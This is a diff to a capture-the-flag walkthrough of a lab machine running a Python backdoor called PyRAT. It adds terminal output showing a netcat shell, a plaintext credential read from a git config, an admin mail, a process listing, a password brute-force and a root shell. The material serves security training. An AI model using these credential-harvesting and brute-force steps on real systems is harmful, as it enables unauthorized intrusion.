@@ -46,8 +46,11 @@ nc <target-ip> 8000
 The service drops the user into an interactive prompt that evaluates basic Python syntax. This effectively provides code execution within a constrained Python environment.
 
   
-
-![[Pasted image 20260119172735.png]]
+```bash
+root@kali:~# nc 10.64.147.169 8000
+print("Hello!")
+Hello!!
+```
 
   
 
@@ -112,9 +115,26 @@ During local enumeration, sensitive credentials are discovered in a Git configur
 The presence of credentials allow direct SSH access to the system as a legitimate user, think
 
   
+```bash
+$ cat /opt/dev/.git/config
+[core]
+    repositoryformatversion = 0
+    filemode = true
+    bare = false
+    logallrefupdates = true
 
-[[Pasted image 20260119173237.png]]
+[user]
+    name = Jose Mario
+    email = josemlwdf@github.com
 
+[credential]
+    helper = cache --timeout=3600
+
+[credential "https://github.com"]
+    username = think
+    password = THINKINGPirate$
+
+```
   
 
 ---
@@ -136,18 +156,40 @@ Further enumeration reveals a clue in the local mail file:
 ```
 
   
+```bash
+think@ip-10-64-147-169:~$ cat /var/mail/think
+From root@ip-10-64-147-169 Thu Jun 15 09:01:55 2023
+Return-Path: <root@ip-10-64-147-169>
+X-Original-To: think@pyrat
+Delivered-To: think@pyrat
+Received: by ip-10-64-147-169 (Postfix, from userid 0)
+    id 2D2F62F1; Thu, 15 Jun 2023 09:01:55 +0000 (UTC)
+Subject: Hello
+To: think@pyrat
+X-Mailer: Mailutils 3.7
+Message-Id: <20230615090155.2D2F62F1@pyrat.localdomain>
+Date: Thu, 15 Jun 2023 09:01:55 +0000 (UTC)
+From: Dible Admin <root@pyrat>
 
-![[Pasted image 20260119173848.png]]
+Hello Jose, I wanted to tell you that I have installed the RAT you posted on your GitHub page, I'll test it tonight so don't be scared if you see it running. Regards, Dible Admin
 
+```
   
 
 The contents reference a process containing the string *“rat”*. Reviewing running services confirms the presence of a suspicious background process. Researching the service leads to the discovery of **PyRAT**, a malicious backdoor.
-
+https://github.com/josemlwdf/PyRAT
   
+```bash
+think@ip-10-64-147-169:~$ ps -aux | grep -i rat
+root       15  0.0  0.0      0     0 ?        00:19  0:00 [migration/0]
+root       21  0.0  0.0      0     0 ?        00:19  0:00 [migration/1]
+root      737  0.0  0.0   2616   536 ?        Ss   00:20  0:00 /bin/sh -c python3 /root/pyrat.py 2>/dev/null
+root      748  0.0  0.6  177640 12460 ?       Sl   00:20  0:00 python3 /root/pyrat.py
+www-data 1563  0.0  0.6  22128 12692 ?        S    00:27  0:00 python3 /root/pyrat.py
+think    1725  0.0  0.0   6440   660 pts/1    S+   00:40  0:00 grep --color=auto -i rat
 
-![[Pasted image 20260119174020.png]]
+```
 
-  
 
 The PyRAT service listens on port 8000 and exposes an undocumented `admin` command. When issued, the service prompts for a password. Because no rate limiting or authentication controls are in place, the password can be brute-forced.
 
@@ -200,12 +242,32 @@ with open(passfile) as f:
 ```
 
   
+```bash
+root@kali:~# python3 brute.py /usr/share/wordlists/rockyou.txt
+[-] Trying 123456 ..
+[-] Trying 12345 ..
+[-] Trying 123456789 ..
+[-] Trying password ..
+[-] Trying iloveyou ..
+[-] Trying princess ..
+[-] Trying rockyou ..
+[-] Trying 12345678 ..
+[+] Password: abc123
 
-![[Pasted image 20260119174832.png]]
+```
 
-![[Pasted image 20260119174858.png]]
+```bash
+root@kali:~# nc 10.64.147.169 8000
+admin
+Password:
+abc123
+Welcome Admin!!! Type "shell" to begin
+shell
+# whoami
+root
+#
 
-  
+```
 
 Successful authentication grants root-level access to the system.
 
